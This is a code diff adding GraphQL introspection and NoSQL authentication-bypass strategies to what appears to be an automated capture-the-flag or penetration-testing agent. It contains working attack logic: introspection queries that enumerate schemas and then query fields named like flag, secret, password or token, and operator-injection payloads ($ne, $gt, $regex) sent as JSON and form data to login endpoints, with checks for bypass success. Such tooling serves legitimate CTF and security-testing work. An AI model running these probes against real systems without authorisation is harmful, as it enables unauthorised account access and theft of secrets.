@@ -249,3 +249,285 @@ class GenericInjectionChainMixin:
             progress=progress,
             reason="; ".join(dict.fromkeys(reasons[:6])) or "generic param ssrf exhausted",
         )
+
+    # ------------------------------------------------------------------ #
+    # API injection: GraphQL introspection + NoSQL auth bypass
+    #
+    # 真实最小探测（非 LLM 兜底空壳）。JSON body 经 LocalRuntime 原生 ``json=``；
+    # 另带 GET ``?query=`` / form-encoded ``[$ne]`` 旁路以兼容 SSH/Docker 的 curl
+    # 取数面。可达性桥接见 chains/web.py 的 ``web_strategy_order``。
+    # ------------------------------------------------------------------ #
+    def _collect_graphql_endpoints(
+        self,
+        target: str,
+        page_features: dict[str, Any],
+    ) -> list[str]:
+        base = _base_target(target)
+        found: list[str] = []
+        seen: set[str] = set()
+
+        def _add(candidate: str) -> None:
+            normalized = _normalize_exploration_url(candidate) or candidate
+            if normalized and normalized not in seen:
+                seen.add(normalized)
+                found.append(normalized)
+
+        patterns = ("/graphql", "/graphiql", "/api/graphql", "/v1/graphql", "/query")
+        seeds = list(page_features.get("endpoints") or []) + list(page_features.get("raw_links") or [])
+        for raw in seeds:
+            text = str(raw or "").strip()
+            if text and any(p in text.lower() for p in patterns):
+                _add(urljoin(base + "/", text))
+        if not found:
+            for path in ("/graphql", "/graphiql", "/api/graphql"):
+                _add(base + path)
+        return found[:4]
+
+    async def _run_graphql_introspection_strategy(
+        self,
+        target: str,
+        page_features: dict[str, Any],
+    ) -> _ChainOutcome:
+        """GraphQL 内省探测：枚举 schema，对 flag 形态字段做跟进查询。
+
+        先 POST 标准内省查询（LocalRuntime 原生 JSON），再 GET ``?query=`` 旁路；
+        schema 暴露即 progress，schema 中出现 flag/secret 形态字段则跟进查询取值，
+        靠 flag 命中 + runtime 验证确认。
+        """
+        self.tool_guard.require(["http_request"])
+        endpoints = self._collect_graphql_endpoints(target, page_features)
+        if not endpoints:
+            return _ChainOutcome(progress=False, reason="graphql_introspection: no graphql endpoint")
+
+        introspection = "{__schema{queryType{name} types{name fields{name}}}}"
+        headers = {"Content-Type": "application/json"}
+        progress = False
+        reasons: list[str] = []
+        for endpoint in endpoints:
+            probes: list[dict[str, Any]] = [
+                {"action": "request", "method": "POST", "url": endpoint, "json": {"query": introspection}, "headers": headers},
+                {"action": "get", "url": _with_query(endpoint, {"query": introspection})},
+            ]
+            for probe in probes:
+                action = probe.pop("action")
+                response = await self._runtime_proxy_action(
+                    action,
+                    timeout=15,
+                    audit_target=endpoint,
+                    audit_metadata={"phase": "graphql_introspection"},
+                    **probe,
+                )
+                body = str((response or {}).get("body") or "")
+                if not body:
+                    continue
+                await self._scan_and_store(body, endpoint, evidence_source="http-response")
+                schema_seen = any(marker in body for marker in ("__schema", '"queryType"', '"types"'))
+                if schema_seen:
+                    progress = True
+                    reasons.append(f"graphql introspection exposed schema at {endpoint}")
+                    await self._store_note(
+                        key="ctf_graphql_introspection",
+                        value=endpoint,
+                        category="vulnerability",
+                        target=urlparse(target).netloc or target,
+                        url=endpoint,
+                    )
+                if extracted_flag := self._extract_flag(body):
+                    verification = await self._observe_flag(
+                        extracted_flag,
+                        target,
+                        evidence_source="http-response",
+                        rationale="graphql introspection",
+                        evidence_url=endpoint,
+                        evidence_snippet=body[:240],
+                        strategy_kind="graphql_introspection",
+                    )
+                    if verification.decision in {"verified", "runtime"}:
+                        return _ChainOutcome(
+                            progress=True,
+                            flag=verification.flag,
+                            reason=f"graphql introspection flag at {endpoint}",
+                        )
+                    progress = True
+                    reasons.append(f"graphql produced {verification.decision} flag")
+                if schema_seen:
+                    followup = await self._graphql_query_suspicious_fields(endpoint, body, target)
+                    if followup.flag:
+                        return followup
+                    progress = progress or followup.progress
+
+        return _ChainOutcome(
+            progress=progress,
+            reason="; ".join(dict.fromkeys(reasons[:5])) or "graphql_introspection exhausted",
+        )
+
+    async def _graphql_query_suspicious_fields(
+        self,
+        endpoint: str,
+        schema_body: str,
+        target: str,
+    ) -> _ChainOutcome:
+        names = set(re.findall(r'"name"\s*:\s*"([A-Za-z_][A-Za-z0-9_]*)"', schema_body))
+        suspicious = [
+            name
+            for name in sorted(names)
+            if any(token in name.lower() for token in ("flag", "secret", "password", "token", "admin"))
+        ]
+        for field in suspicious[:4]:
+            response = await self._runtime_proxy_action(
+                "request",
+                method="POST",
+                url=endpoint,
+                json={"query": "{%s}" % field},
+                headers={"Content-Type": "application/json"},
+                timeout=15,
+                audit_target=endpoint,
+                audit_metadata={"phase": "graphql_query", "field": field},
+            )
+            body = str((response or {}).get("body") or "")
+            if not body:
+                continue
+            await self._scan_and_store(body, endpoint, evidence_source="http-response")
+            if extracted_flag := self._extract_flag(body):
+                verification = await self._observe_flag(
+                    extracted_flag,
+                    target,
+                    evidence_source="http-response",
+                    rationale=f"graphql field {field}",
+                    evidence_url=endpoint,
+                    evidence_snippet=body[:240],
+                    strategy_kind="graphql_introspection",
+                )
+                if verification.decision in {"verified", "runtime"}:
+                    return _ChainOutcome(
+                        progress=True,
+                        flag=verification.flag,
+                        reason=f"graphql field {field} flag",
+                    )
+        return _ChainOutcome(progress=bool(suspicious), reason="")
+
+    def _collect_nosql_endpoints(
+        self,
+        target: str,
+        page_features: dict[str, Any],
+    ) -> list[str]:
+        base = _base_target(target)
+        found: list[str] = []
+        seen: set[str] = set()
+
+        def _add(candidate: str) -> None:
+            normalized = _normalize_exploration_url(candidate) or candidate
+            if normalized and normalized not in seen:
+                seen.add(normalized)
+                found.append(normalized)
+
+        patterns = ("/login", "/api/login", "/auth", "/signin", "/session", "/user", "/api/")
+        seeds = list(page_features.get("endpoints") or []) + list(page_features.get("raw_links") or [])
+        for raw in seeds:
+            text = str(raw or "").strip()
+            if text and any(p in text.lower() for p in patterns):
+                _add(urljoin(base + "/", text))
+        for form in page_features.get("forms") or []:
+            if not isinstance(form, dict):
+                continue
+            if str(form.get("method") or "GET").strip().upper() != "POST":
+                continue
+            action = urljoin(
+                target if target.endswith("/") else target + "/",
+                str(form.get("action") or "").strip(),
+            )
+            _add(action)
+        if not found:
+            for path in ("/login", "/api/login", "/auth"):
+                _add(base + path)
+        return found[:4]
+
+    async def _run_nosql_injection_strategy(
+        self,
+        target: str,
+        page_features: dict[str, Any],
+    ) -> _ChainOutcome:
+        """NoSQL 认证绕过探测：算子注入（``$ne``/``$gt``/``$regex``）。
+
+        JSON body + form-encoded ``[$ne]`` 双形态，靠 flag 命中 + runtime 验证，
+        或登录成功标志（状态 200/302 + 成功标记 / Set-Cookie）确认绕过。
+        """
+        self.tool_guard.require(["http_request"])
+        endpoints = self._collect_nosql_endpoints(target, page_features)
+        if not endpoints:
+            return _ChainOutcome(progress=False, reason="nosql_injection: no candidate endpoint")
+
+        json_payloads = [
+            {"username": {"$ne": None}, "password": {"$ne": None}},
+            {"username": {"$gt": ""}, "password": {"$gt": ""}},
+            {"username": "admin", "password": {"$ne": "wrong"}},
+            {"username": {"$regex": "^adm"}, "password": {"$ne": ""}},
+        ]
+        form_payloads = [
+            {"username[$ne]": "x", "password[$ne]": "x"},
+            {"username[$gt]": "", "password[$gt]": ""},
+        ]
+        body_markers = ("welcome", "dashboard", "logout", "token", "success", "flag", "authenticated")
+        progress = False
+        reasons: list[str] = []
+        for endpoint in endpoints:
+            attempts: list[dict[str, Any]] = [
+                {"method": "POST", "url": endpoint, "json": payload, "headers": {"Content-Type": "application/json"}}
+                for payload in json_payloads
+            ]
+            attempts += [
+                {"method": "POST", "url": endpoint, "data": payload}
+                for payload in form_payloads
+            ]
+            for opts in attempts:
+                response = await self._runtime_proxy_action(
+                    "request",
+                    timeout=15,
+                    audit_target=endpoint,
+                    audit_metadata={"phase": "nosql_injection"},
+                    **opts,
+                )
+                if not isinstance(response, dict):
+                    continue
+                body = str(response.get("body") or "")
+                status = int(response.get("status_code") or 0)
+                header_blob = " ".join(
+                    f"{key}:{value}" for key, value in (response.get("headers") or {}).items()
+                ).lower()
+                await self._scan_and_store(body, endpoint, evidence_source="http-response")
+                if extracted_flag := self._extract_flag(body):
+                    verification = await self._observe_flag(
+                        extracted_flag,
+                        target,
+                        evidence_source="http-response",
+                        rationale="nosql auth bypass",
+                        evidence_url=endpoint,
+                        evidence_snippet=body[:240],
+                        strategy_kind="nosql_injection",
+                    )
+                    if verification.decision in {"verified", "runtime"}:
+                        return _ChainOutcome(
+                            progress=True,
+                            flag=verification.flag,
+                            reason=f"nosql bypass flag at {endpoint}",
+                        )
+                    progress = True
+                    reasons.append(f"nosql produced {verification.decision} flag")
+                bypassed = status in {200, 302} and (
+                    any(marker in body.lower() for marker in body_markers)
+                    or "set-cookie" in header_blob
+                )
+                if bypassed:
+                    progress = True
+                    reasons.append(f"nosql auth bypass signal at {endpoint} (status {status})")
+                    await self._store_note(
+                        key="ctf_nosql_bypass",
+                        value=endpoint,
+                        category="vulnerability",
+                        target=urlparse(target).netloc or target,
+                        url=endpoint,
+                    )
+        return _ChainOutcome(
+            progress=progress,
+            reason="; ".join(dict.fromkeys(reasons[:5])) or "nosql_injection exhausted",
+        )
